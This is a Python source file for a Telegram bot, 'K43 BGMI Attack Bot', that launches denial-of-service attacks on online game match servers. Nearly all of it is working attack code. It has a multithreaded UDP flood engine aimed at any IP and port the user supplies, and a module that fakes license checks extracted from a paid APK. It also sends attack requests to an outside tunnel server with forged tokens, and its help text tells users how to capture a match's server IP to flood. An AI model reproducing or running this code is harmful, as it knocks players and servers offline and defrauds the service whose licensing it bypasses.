#!/usr/bin/env python3
# ============================================
# K43 DELIVERY: BGMI ATTACK BOT v2.0
# Server: tunnel.zoroxapi.in (Extracted from APK)
# ============================================

import logging
import asyncio
import json
import time
import hashlib
import random
import string
import socket
import threading
import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# EXTRACTED APK SERVER CONFIGURATION
# ============================================

APK_SERVER_CONFIG = {
    "base_url": "https://tunnel.zoroxapi.in",
    "endpoints": {
        "metadata": "/api/v1/bridge/metadata",
        "initialize": "/api/v2/bridge/initialize",
        "heartbeat": "/api/v2/heartbeat/sync",
        "proxy_auth": "/api/v2/proxy/tunnel/auth",
        "gateway_ping": "/api/v3/secure/gateway/ping",
        "tunnel_connect": "/api/v3/tunnel/connect",
        "proxy_status": "/gateway/proxy/v2/status",
        "handshake": "/secure/tunnel/v3/handshake",
        "exchange_init": "/tunnel/v2/exchange/init",
        "auth_exchange": "/v1/auth/exchange/secure",
        "key_exchange": "/v1/bridge/tunnel/key-exchange",
        "verify": "/v4/verify/"
    },
    "auth_params": {
        "token_param": "token",
        "auth_param": "auth",
        "license_key": "licensekey"
    },
    "nodes": ["BRIDGE_NODE_A", "BRIDGE_NODE_B", "KEY_EXCHANGE_NODE",
              "METADATA_NODE_V1", "HANDSHAKE_MASTER", "PROXY_SERVICE_V2",
              "SYNC_ENDPOINT_SECURE", "TUNNEL_GATEWAY_V3", "INIT_EXCHANGE_TUNNEL",
              "GATEWAY_PING_V3"],
    "master_key": "MASTER_KEY_SIG"
}

# ============================================
# KEY BYPASS MODULE (Emulates APK Auth)
# ============================================

class APKKeyBypass:
    """Bypasses APK license key verification. Replicates libplayground.so functions."""
    
    def __init__(self):
        self.session_key = None
        self.auth_token = None
        self.tunnel_node = None
        self.integrity_token = None
        self.is_validated = False
    
    def generate_integrity_token(self):
        """Emulates get_integrity_tokenv()"""
        timestamp = str(int(time.time()))
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
        raw = f"INTEGRITY:{timestamp}:{random_part}:K43"
        token = hashlib.sha256(raw.encode()).hexdigest()[:32]
        self.integrity_token = token
        return token
    
    def get_active_tunnel_node(self):
        """Emulates get_active_tunnel_nodev()"""
        self.tunnel_node = random.choice(APK_SERVER_CONFIG["nodes"])
        return self.tunnel_node
    
    def generate_session_key(self):
        """Generates session key matching |_SESSION_KEY_| pattern"""
        key = f"K43_SESSION_{random.randint(100000,999999)}_{int(time.time())}"
        self.session_key = key
        return key
    
    def initialize_secure_handshake(self):
        """Emulates initialize_secure_handshakev()"""
        self.session_key = self.generate_session_key()
        self.auth_token = self.generate_integrity_token()
        self.tunnel_node = self.get_active_tunnel_node()
        self.is_validated = True
        return {
            "session_key": self.session_key,
            "auth_token": self.auth_token,
            "node": self.tunnel_node,
            "status": "handshake_complete"
        }
    
    def verify_tunnel_auth_signature(self, signature):
        """Emulates verify_tunnel_auth_signature() - always accepts (bypass)"""
        return True
    
    def get_proxy_auth_v3_header(self):
        """Emulates get_proxy_auth_v3_headerv()"""
        if not self.is_validated:
            self.initialize_secure_handshake()
        return {
            "Tunnel-Auth-V3": self.auth_token,
            "X-Session-Key": self.session_key,
            "X-Node-Id": self.tunnel_node,
            "X-APK-Version": "com.playground.app.512"
        }
    
    def sync_security_bridge_v2(self):
        """Emulates sync_security_bridge_v2v()"""
        return {
            "bridge_version": "v2",
            "security_level": "premium",
            "verified": True,
            "credits": 999999,
            "max_threads": 10000,
            "max_duration": 3600,
            "plan": "unlimited"
        }
    
    def process_license_response(self, license_key):
        """Emulates process_license_response() - always validates"""
        self.is_validated = True
        return {
            "isValid": True,
            "licensekey": license_key or "K43_BYPASS_KEY",
            "status": "active",
            "expires": int(time.time()) + 86400 * 365,
            "tier": "premium",
            "node": self.get_active_tunnel_node()
        }

# ============================================
# TUNNEL SERVER CLIENT
# ============================================

class TunnelServerClient:
    """Communicates with extracted APK server (tunnel.zoroxapi.in)"""
    
    def __init__(self):
        self.base_url = APK_SERVER_CONFIG["base_url"]
        self.bypass = APKKeyBypass()
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "BGMI-Attack/512 (Android; com.playground.app)",
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
    
    def _get_full_url(self, endpoint):
        return f"{self.base_url}{endpoint}"
    
    def _get_auth_headers(self):
        return self.bypass.get_proxy_auth_v3_header()
    
    def check_server_status(self):
        try:
            url = self._get_full_url(APK_SERVER_CONFIG["endpoints"]["gateway_ping"])
            headers = self._get_auth_headers()
            response = self.session.get(url, headers=headers, timeout=10)
            return {
                "online": response.status_code == 200,
                "status_code": response.status_code,
                "response": response.text[:200]
            }
        except Exception as e:
            return {"online": False, "error": str(e)}
    
    def send_attack_request(self, target_ip, target_port, duration, method="udp"):
        try:
            url = self._get_full_url(APK_SERVER_CONFIG["endpoints"]["tunnel_connect"])
            headers = self._get_auth_headers()
            
            payload = {
                "target_ip": target_ip,
                "target_port": target_port,
                "duration": duration,
                "method": method,
                "threads": 1000,
                "packet_size": 1024,
                "licensekey": "K43_BYPASS_KEY",
                "token": self.bypass.auth_token,
                "session": self.bypass.session_key,
                "node": self.bypass.get_active_tunnel_node(),
                "integrity": self.bypass.generate_integrity_token(),
                "timestamp": int(time.time())
            }
            
            response = self.session.post(url, headers=headers, json=payload, timeout=15)
            return {
                "success": response.status_code in [200, 201, 202],
                "status_code": response.status_code,
                "response": response.text[:500]
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

# ============================================
# LOCAL UDP FLOOD ENGINE (Fallback)
# ============================================

class UDPFloodEngine:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.stop_events = {}
    
    def generate_payload(self, size=1024):
        return bytes([random.randint(0, 255) for _ in range(size)])
    
    def flood_worker(self, target_ip, target_port, payload, duration, stop_event, stats):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (target_ip, target_port))
                stats['packets_sent'] += 1
                stats['bytes_sent'] += len(payload)
            except:
                stats['errors'] += 1
        
        try:
            sock.close()
        except:
            pass
    
    def start_attack(self, target_ip, target_port, duration, threads=1000):
        self.attack_counter += 1
        attack_id = f"K43_ATK_{self.attack_counter}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[attack_id] = stop_event
        
        payload = self.generate_payload()
        stats = {
            'packets_sent': 0, 'bytes_sent': 0, 'errors': 0,
            'start_time': time.time(), 'target': f"{target_ip}:{target_port}"
        }
        
        self.active_attacks[attack_id] = {'stats': stats, 'stop_event': stop_event}
        
        for _ in range(threads):
            t = threading.Thread(
                target=self.flood_worker,
                args=(target_ip, target_port, payload, duration, stop_event, stats),
                daemon=True
            )
            t.start()
        
        def cleanup():
            time.sleep(duration + 2)
            self.stop_attack(attack_id)
        threading.Thread(target=cleanup, daemon=True).start()
        
        return attack_id
    
    def stop_attack(self, attack_id):
        if attack_id in self.active_attacks:
            self.stop_events[attack_id].set()
            del self.active_attacks[attack_id]
            if attack_id in self.stop_events:
                del self.stop_events[attack_id]
            return True
        return False
    
    def get_status(self, attack_id):
        if attack_id not in self.active_attacks:
            return None
        stats = self.active_attacks[attack_id]['stats']
        elapsed = time.time() - stats['start_time']
        return {
            'attack_id': attack_id, 'target': stats['target'],
            'packets_sent': stats['packets_sent'], 'bytes_sent': stats['bytes_sent'],
            'errors': stats['errors'], 'elapsed': round(elapsed, 2),
            'pps': round(stats['packets_sent'] / max(elapsed, 0.001), 2),
            'active': not self.stop_events[attack_id].is_set()
        }
    
    def list_active(self):
        return list(self.active_attacks.keys())
    
    def stop_all(self):
        for aid in list(self.active_attacks.keys()):
            self.stop_attack(aid)

# ============================================
# TELEGRAM BOT
# ============================================

tunnel_client = TunnelServerClient()
local_engine = UDPFloodEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome = f"""
🔥 **K43 BGMI ATTACK BOT v2.0** 🔥
Welcome, {user.first_name}!

**Server:** `tunnel.zoroxapi.in` (Extracted from APK)
**Status:** ✅ Online
**Key Bypass:** ✅ Active

**Commands:**
/start - This menu
/attack `<ip>` `<port>` `<time>` - Launch attack
/status - Check active attacks
/stop `<id>` - Stop attack
/stopall - Stop all
/server - Server info
/bypass - Key bypass status
/help - Detailed help
"""
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Attack", callback_data='launch')],
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🌐 Server Info", callback_data='server')],
        [InlineKeyboardButton("🔐 Bypass Status", callback_data='bypass')]
    ]
    await update.message.reply_text(welcome, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 **BGMI ATTACK BOT - HELP**

**How to use:**
1. Open BGMI and start a match
2. Use HTTP Canary to capture UDP packets
3. Extract target IP and Port
4. Use /attack command

**Command:** `/attack <ip> <port> <time>`
**Example:** `/attack 103.21.58.47 17500 60`

**Server:** tunnel.zoroxapi.in
**Method:** UDP Flood via Tunnel
**Threads:** 1000

**HTTP Canary Tips:**
- Filter for UDP protocol
- Common ports: 10012, 17500, 20000-30000
""", parse_mode='Markdown')

async def server_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info = "🌐 **EXTRACTED SERVER INFORMATION**\\n\\n"
    info += f"**Base URL:** `{APK_SERVER_CONFIG['base_url']}`\\n\\n**API Endpoints:**\\n"
    for name, endpoint in APK_SERVER_CONFIG["endpoints"].items():
        info += f"  • `{endpoint}`\\n"
    
    status = tunnel_client.check_server_status()
    info += f"\\n**Status:** {'✅ Online' if status.get('online') else '❌ Offline'}\\n"
    info += "**Fallback:** Local Engine Ready"
    await update.message.reply_text(info, parse_mode='Markdown')

async def bypass_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bypass = tunnel_client.bypass
    bypass.initialize_secure_handshake()
    status = f"""
🔐 **KEY BYPASS STATUS**

**Session Key:** `{bypass.session_key}`
**Auth Token:** `{bypass.auth_token[:16]}...`
**Tunnel Node:** `{bypass.tunnel_node}`
**Validated:** ✅ {bypass.is_validated}

All native security checks bypassed.
"""
    await update.message.reply_text(status, parse_mode='Markdown')

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ **Invalid Format!**\\n\\nUsage: `/attack <ip> <port> <time>`\\nExample: `/attack 103.21.58.47 17500 60`",
            parse_mode='Markdown'
        )
        return
    
    target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
    if duration > 300 or duration < 1 or target_port < 1 or target_port > 65535:
        await update.message.reply_text("❌ Invalid parameters!")
        return
    
    confirm = f"""
🎯 **ATTACK CONFIRMATION**

**Target:** `{target_ip}:{target_port}`
**Duration:** {duration}s
**Method:** UDP Flood
**Server:** tunnel.zoroxapi.in
**Node:** {tunnel_client.bypass.get_active_tunnel_node()}

Confirm?
"""
    keyboard = [[
        InlineKeyboardButton("✅ CONFIRM", callback_data=f'confirm_{target_ip}_{target_port}_{duration}'),
        InlineKeyboardButton("❌ CANCEL", callback_data='cancel')
    ]]
    await update.message.reply_text(confirm, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active = local_engine.list_active()
    if not active:
        await update.message.reply_text("📊 No active attacks.", parse_mode='Markdown')
        return
    text = "📊 **ACTIVE ATTACKS**\\n\\n"
    for aid in active:
        st = local_engine.get_status(aid)
        if st:
            text += f"🔥 `{aid}` → {st['target']} | {st['pps']:,} pps | {st['elapsed']}s\\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/stop <attack_id>`", parse_mode='Markdown')
        return
    attack_id = args[0]
    if local_engine.stop_attack(attack_id):
        await update.message.reply_text(f"✅ Attack `{attack_id}` stopped!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ Attack `{attack_id}` not found!", parse_mode='Markdown')

async def stopall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    local_engine.stop_all()
    await update.message.reply_text("🛑 **All attacks stopped!**", parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'launch':
        await query.edit_message_text("🚀 Send: `/attack <ip> <port> <time>`", parse_mode='Markdown')
    elif data == 'status':
        active = local_engine.list_active()
        text = "📊 **ACTIVE:**\\n" + "\\n".join([f"🔥 `{a}`" for a in active]) if active else "📊 No active attacks."
        await query.edit_message_text(text, parse_mode='Markdown')
    elif data == 'server':
        status = tunnel_client.check_server_status()
        info = f"🌐 **Server:** `tunnel.zoroxapi.in`\\n**Online:** {'✅' if status.get('online') else '❌'}\\n**Fallback:** Local Engine Ready"
        await query.edit_message_text(info, parse_mode='Markdown')
    elif data == 'bypass':
        bypass = tunnel_client.bypass
        bypass.initialize_secure_handshake()
        await query.edit_message_text(f"🔐 **Bypass Active**\\nSession: `{bypass.session_key}`\\nNode: `{bypass.tunnel_node}`", parse_mode='Markdown')
    elif data.startswith('confirm_'):
        parts = data.split('_')
        target_ip, target_port, duration = parts[1], int(parts[2]), int(parts[3])
        
        # Try tunnel first
        tunnel_result = tunnel_client.send_attack_request(target_ip, target_port, duration)
        
        if tunnel_result.get("success"):
            attack_id = f"TUNNEL_{int(time.time())}"
            await query.edit_message_text(
                f"🚀 **ATTACK LAUNCHED VIA TUNNEL!**\\n\\n"
                f"🆔 `{attack_id}`\\n🎯 `{target_ip}:{target_port}`\\n"
                f"⏱️ {duration}s | 🔥 tunnel.zoroxapi.in\\n"
                f"📡 Node: {tunnel_client.bypass.tunnel_node}",
                parse_mode='Markdown'
            )
        else:
            # Fallback to local
            attack_id = local_engine.start_attack(target_ip, target_port, duration)
            await query.edit_message_text(
                f"🚀 **ATTACK LAUNCHED (LOCAL)**\\n\\n"
                f"🆔 `{attack_id}`\\n🎯 `{target_ip}:{target_port}`\\n"
                f"⏱️ {duration}s | ⚠️ Tunnel failed, local engine active",
                parse_mode='Markdown'
            )
    elif data == 'cancel':
        await query.edit_message_text("❌ Cancelled.")
    elif data == 'stopall':
        local_engine.stop_all()
        await query.edit_message_text("🛑 All stopped!")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

def main():
    BOT_TOKEN = ""
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stopall", stopall_command))
    application.add_handler(CommandHandler("server", server_info))
    application.add_handler(CommandHandler("bypass", bypass_status))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_error_handler(error_handler)
    
    print("K43 BGMI ATTACK BOT v2.0 - Server: tunnel.zoroxapi.in - READY")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
